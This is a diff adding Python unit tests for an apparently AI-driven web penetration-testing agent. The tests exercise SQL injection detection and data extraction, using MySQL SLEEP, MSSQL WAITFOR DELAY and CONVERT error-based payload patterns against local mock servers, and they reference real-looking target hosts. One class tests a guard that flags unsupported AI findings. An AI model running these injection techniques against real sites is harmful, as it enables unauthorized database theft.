@@ -463,7 +463,9 @@ class TestQuoteDifferential(unittest.TestCase):
             method="get", engine="auto")
         self.assertIn("CONFIRMED", out)
         self.assertIn("quote-differential", out)
-        self.assertNotIn("time-based", out)
+        # không chạy row time-based (v1.4.5: từ 'time-based' vẫn xuất hiện
+        # trong gợi ý BƯỚC TIẾP THEO — chỉ cấm row thực thi)
+        self.assertNotIn("[*] time-based", out)
 
 
 class FormsPageHandler(BaseHTTPRequestHandler):
@@ -1574,6 +1576,301 @@ class TestEvidenceGuard(unittest.TestCase):
         self.assertEqual(findings[2].evidence_gaps, [])
         self.assertTrue(any("404" in g for g in findings[3].evidence_gaps))
         self.assertTrue(any("cấu hình" in g for g in findings[4].evidence_gaps))
+
+
+class TestManualTestNextStep(unittest.TestCase):
+    """v1.4.5: sqli_manual_test CONFIRMED → bắt buộc in [→] BƯỚC TIẾP THEO
+escalate sqli_blind_extract (kèm method/param/data sẵn cho POST form)."""
+
+    @staticmethod
+    def _resp(status, content, elapsed=1.0):
+        r = MagicMock()
+        r.status_code = status
+        r.content = content
+        r.elapsed.total_seconds.return_value = elapsed
+        return r
+
+    def test_post_confirmed_emits_next_step(self):
+        from tools import _sqli_manual_test
+        # baseline 200 → quote-single 500 (vỡ truy vấn) → quote-double KHỚP baseline
+        base, broken, ok = self._resp(200, b"k" * 500), self._resp(500, b"error!"), \
+            self._resp(200, b"k" * 500)
+        with patch("requests.post", side_effect=[base, broken, ok]) as mp:
+            out = _sqli_manual_test(url="https://abc.vn/WebTinTuc/TimKiem",
+                                    param="q", method="post", engine="mssql")
+        self.assertEqual(mp.call_count, 3)  # CONFIRMED quote-diff → không cần time-based
+        self.assertIn("[✓] SQLI CONFIRMED", out)
+        self.assertIn("BƯỚC TIẾP THEO", out)
+        self.assertIn("sqli_blind_extract", out)
+        # next-step khâu sẵn method/param/data cho POST form
+        self.assertIn("action:'version", out)
+        self.assertIn("method:'post'", out)
+        self.assertIn("param:'q'", out)
+        self.assertIn("data:'q=test'", out)
+        self.assertIn("generate_poc", out)
+        self.assertIn("[+] verdict: CONFIRMED", out)
+
+    def test_get_confirmed_next_step_hints_timebased(self):
+        from tools import _sqli_manual_test
+        base, broken, ok = self._resp(200, b"k" * 500), self._resp(500, b"error!"), \
+            self._resp(200, b"k" * 500)
+        with patch("requests.get", side_effect=[base, broken, ok]) as mg:
+            out = _sqli_manual_test(url="https://abc.vn/search", param="id",
+                                    method="get", engine="mssql")
+        self.assertEqual(mg.call_count, 3)
+        self.assertIn("BƯỚC TIẾP THEO", out)
+        self.assertIn("time-based nếu oracle không ăn", out)
+        self.assertIn("poc_executor", out)
+
+
+class PostFormSqliHandler(BaseHTTPRequestHandler):
+    """Form POST giả lập: chỉ sleep khi body chứa payload hợp lệ
+    (mysql ' AND (SLEEP(n))…; mssql '; IF(...) WAITFOR DELAY '0:0:n')."""
+
+    def do_POST(self):
+        n = int(self.headers.get("Content-Length", 0))
+        decoded = unquote_plus(self.rfile.read(n).decode("utf-8", "replace"))
+        m = re.search(r"'\s*AND\s*\([^)]*SLEEP\(\s*(\d+(?:\.\d+)?)\s*\)", decoded)
+        mssql = re.search(r"'\s*;\s*IF\s*\([^)]*\)\s*WAITFOR\s+DELAY\s+'0:0:(\d+)'",
+                          decoded)
+        if "--" in decoded or "#" in decoded:
+            if m:
+                time.sleep(float(m.group(1)))
+            elif mssql:
+                time.sleep(float(mssql.group(1)))
+        body = b"<html>ok</html>"
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html")
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
+    def log_message(self, *args):
+        pass
+
+
+class TestPostFormBlindExtract(unittest.TestCase):
+    """v1.4.5: sqli_blind_extract method=post + param + data — detect qua
+    POST form (mysql SLEEP + mssql WAITFOR fallback khi oracle không ăn),
+    regression: trước fix mode không được set → crash nhánh GET._build_url."""
+    server = None
+
+    @classmethod
+    def setUpClass(cls):
+        cls.server = HTTPServer(("127.0.0.1", 0), PostFormSqliHandler)
+        cls.port = cls.server.server_address[1]
+        cls.thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
+        cls.thread.start()
+
+    @classmethod
+    def tearDownClass(cls):
+        if cls.server:
+            cls.server.shutdown()
+            cls.server.server_close()
+
+    def _agent(self):
+        return WebXAgent(config=cfg({"targets": ["localhost", "http://127.0.0.1"],
+                                     "auto_exec": "all", "tool_timeout": 30}),
+                         chat=FakeChat())
+
+    def _form_args(self, **extra):
+        a = {"url": f"http://127.0.0.1:{self.port}/WebTinTuc/TimKiem",
+             "method": "post", "param": "keyword", "data": "keyword=tin tuc",
+             "action": "detect", "delay": 1, "threshold": 0.7}
+        a.update(extra)
+        return a
+
+    def test_mysql_form_detect_confirmed(self):
+        a = self._agent()
+        res = a._dispatch("sqli_blind_extract", self._form_args(engine="mysql"))
+        self.assertEqual(res["outcome"], "ok")
+        self.assertIn("CONFIRMED", res["output"])
+        self.assertIn("mode=form", res["output"])
+        self.assertIn("form@keyword", res["output"])
+
+    def test_mssql_form_detect_waitfor_fallback(self):
+        """Oracle CONVERT không ăn trên handler này → fallback WAITFOR DELAY
+        qua POST form vẫn CONFIRMED (mode=form, không crash)._build_url"""
+        a = self._agent()
+        res = a._dispatch("sqli_blind_extract", self._form_args(engine="mssql"))
+        self.assertEqual(res["outcome"], "ok")
+        self.assertIn("CONFIRMED", res["output"])
+        self.assertIn("mode=form", res["output"])
+
+
+MSSQL_VERSION = "Microsoft SQL Server 2019 (RTM) 15.0.2000.5"
+MSSQL_DB = "tbu_news"
+MSSQL_USER = "sa"
+
+
+class ErrorOracleHandler(BaseHTTPRequestHandler):
+    """MSSQL error-based oracle giả lập: payload ' AND CONVERT(int,(expr))-- -
+    → 500 "Conversion failed when converting the nvarchar value '<value>'".
+    Mini evaluator: SUBSTRING((inner),pos,len) unwrap đệ quy;
+    @@VERSION → MSSQL_VERSION; DB_NAME() → tbu_news; SUSER_SNAME() → sa.
+    Regex GREEDY 'CONVERT(int,((.+))-- -' — lazy sẽ FAIL vì tail 3 ngoặc."""
+
+    VALUE = {"@@VERSION": MSSQL_VERSION, "DB_NAME()": MSSQL_DB,
+             "SUSER_SNAME()": MSSQL_USER}
+
+    def _value(self, expr: str) -> str:
+        expr = (expr or "").strip()
+        m = re.match(r"SUBSTRING\(\((.*)\),\s*(\d+)\s*,\s*(\d+)\s*\)",
+                     expr, re.S)
+        if m:
+            pos, ln = int(m.group(2)), int(m.group(3))
+            val = self._value(m.group(1))
+            return val[pos - 1:pos - 1 + ln]
+        up = expr.upper()
+        if up.startswith("SELECT "):
+            up = up[7:].strip()
+        return self.VALUE.get(up, "")
+
+    def _respond(self, code: int, text: str):
+        body = text.encode("utf-8", "replace")
+        self.send_response(code)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
+    def _handle(self, decoded: str):
+        m = re.search(r"CONVERT\s*\(\s*int\s*,\s*\((.+)\)--\s*-", decoded, re.S)
+        if m:
+            val = self._value(m.group(1)).replace("'", "''")
+            self._respond(500, "Conversion failed when converting the nvarchar "
+                               f"value '{val}' to data type int.")
+        else:
+            self._respond(200, "<html>ok</html>")
+
+    def do_GET(self):
+        self._handle(unquote_plus(self.path))
+
+    def do_POST(self):
+        n = int(self.headers.get("Content-Length", 0))
+        self._handle(unquote_plus(self.rfile.read(n).decode("utf-8", "replace")))
+
+    def log_message(self, *args):
+        pass
+
+
+class TestMssqlErrorOracle(unittest.TestCase):
+    """v1.4.5: engine=mssql → error-based oracle CONVERT(int, SUBSTRING((expr)))
+    đọc dữ liệu từ lỗi 500 — detect + version (query), database (POST form),
+    detect mode=form, technique=error-based-mssql."""
+    server = None
+
+    @classmethod
+    def setUpClass(cls):
+        cls.server = HTTPServer(("127.0.0.1", 0), ErrorOracleHandler)
+        cls.port = cls.server.server_address[1]
+        cls.thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
+        cls.thread.start()
+
+    @classmethod
+    def tearDownClass(cls):
+        if cls.server:
+            cls.server.shutdown()
+            cls.server.server_close()
+
+    def _agent(self):
+        return WebXAgent(config=cfg({"targets": ["localhost", "http://127.0.0.1"],
+                                     "auto_exec": "all", "tool_timeout": 30}),
+                         chat=FakeChat())
+
+    def test_query_version_extracted_from_500(self):
+        a = self._agent()
+        res = a._dispatch("sqli_blind_extract", {
+            "url": f"http://127.0.0.1:{self.port}/x.php?id=123",
+            "action": "version", "engine": "mssql", "delay": 1,
+            "threshold": 0.7})
+        self.assertEqual(res["outcome"], "ok")
+        self.assertIn("CONFIRMED", res["output"])
+        self.assertIn("mode=query", res["output"])
+        self.assertIn("Microsoft SQL Server 2019", res["output"])
+
+    def test_post_form_database_extracted(self):
+        a = self._agent()
+        res = a._dispatch("sqli_blind_extract", {
+            "url": f"http://127.0.0.1:{self.port}/WebTinTuc/TimKiem",
+            "method": "post", "param": "keyword", "data": "keyword=tin tuc",
+            "action": "database", "engine": "mssql", "delay": 1,
+            "threshold": 0.7})
+        self.assertEqual(res["outcome"], "ok")
+        self.assertIn("CONFIRMED", res["output"])
+        self.assertIn("mode=form", res["output"])
+        self.assertIn("database: tbu_news", res["output"])
+
+    def test_post_form_detect_mode_form(self):
+        a = self._agent()
+        res = a._dispatch("sqli_blind_extract", {
+            "url": f"http://127.0.0.1:{self.port}/WebTinTuc/TimKiem",
+            "method": "post", "param": "keyword", "data": "keyword=tin tuc",
+            "action": "detect", "engine": "mssql", "delay": 1,
+            "threshold": 0.7})
+        self.assertEqual(res["outcome"], "ok")
+        self.assertIn("CONFIRMED", res["output"])
+        self.assertIn("mode=form", res["output"])
+        self.assertIn("form@keyword", res["output"])
+
+    def test_oracle_technique_error_based(self):
+        from sqli_blind_poc import TimeBlindExploiter
+        ex = TimeBlindExploiter(
+            f"http://127.0.0.1:{self.port}/x.php?id=123",
+            engine="mssql", method="get", param="id",
+            delay=1.0, threshold=0.7)
+        self.assertTrue(ex.detect())
+        self.assertEqual(ex.technique, "error-based-mssql")
+        self.assertTrue(ex.oracle is not None)
+        self.assertEqual(ex.version(), MSSQL_VERSION)
+        self.assertEqual(ex.database(), MSSQL_DB)
+        self.assertEqual(ex.user(), MSSQL_USER)
+
+
+class TestLedgerPathGuard(TestEvidenceGuard):
+    """v1.4.5: guard path-claim sai host — path trong finding phải xuất hiện
+    trong tool output OK CỦA CÙNG host, nếu không là bịa đường dẫn."""
+
+    def test_path_claim_without_tool_evidence_flagged(self):
+        """Tái hiện live-run: AI báo detect /admincp nhưng không tool nào thấy
+        /admincp (http_probe chỉ thấy IIS banner) → phải bị cờ."""
+        history = [self._call("http_probe",
+                              "status 200, server: Microsoft-IIS; content-type: text/html",
+                              url="https://tbu.edu.vn")]
+        f = self._f("SQL Injection tại /admincp", url="https://tbu.edu.vn",
+                    description="Detect /admincp qua banner IIS")
+        self.assertEqual(check_findings_evidence([f], history), 1)
+        self.assertTrue(any("path" in g and "admincp" in g for g in f.evidence_gaps))
+
+    def test_path_claim_backed_by_same_host_ok(self):
+        """Path /WebTinTuc/TimKiem xuất hiện trong output find_forms CỦA CÙNG
+        host tbu.edu.vn → không gap; find_forms giờ nằm trong nhóm probe-like
+        nên cũng không bị cờ 'chưa probe thật'."""
+        history = [self._call(
+            "find_forms",
+            "[i] find_forms — https://tbu.edu.vn/ → 200, 18452 chars, 1 form(s): "
+            "action='/WebTinTuc/TimKiem' method='POST' inputs: keyword(text)",
+            url="https://tbu.edu.vn/")]
+        f = self._f("MSSQL Error-Based SQLi",
+                    url="https://tbu.edu.vn/WebTinTuc/TimKiem",
+                    description="SQLi error-based tại form tìm kiếm /WebTinTuc/TimKiem "
+                                "(tham số keyword, quote-differential)")
+        self.assertEqual(check_findings_evidence([f], history), 0, f.evidence_gaps)
+
+    def test_path_claim_same_token_but_wrong_host_flagged(self):
+        """Path /admincp chỉ xuất hiện trong output của host KHÁC (abc.vn),
+        còn host CỦA FINDING (tbu.edu.vn) có evidence nhưng không chứa /admincp
+        → guard path-cùng-host phải cờ (không lẫn bằng chứng liên host)."""
+        history = [
+            self._call("http_probe", "status 200, server: Microsoft-IIS",
+                       url="https://tbu.edu.vn"),
+            self._call("ffuf_dir", "thấy 200 /admincp (size 2841)",
+                       url="https://abc.vn"),
+        ]
+        f = self._f("Admin panel tại /admincp", url="https://tbu.edu.vn",
+                    description="Có /admincp trên tbu")
+        self.assertEqual(check_findings_evidence([f], history), 1)
+        self.assertTrue(any("path" in g and "admincp" in g for g in f.evidence_gaps))
 
 
 if __name__ == "__main__":
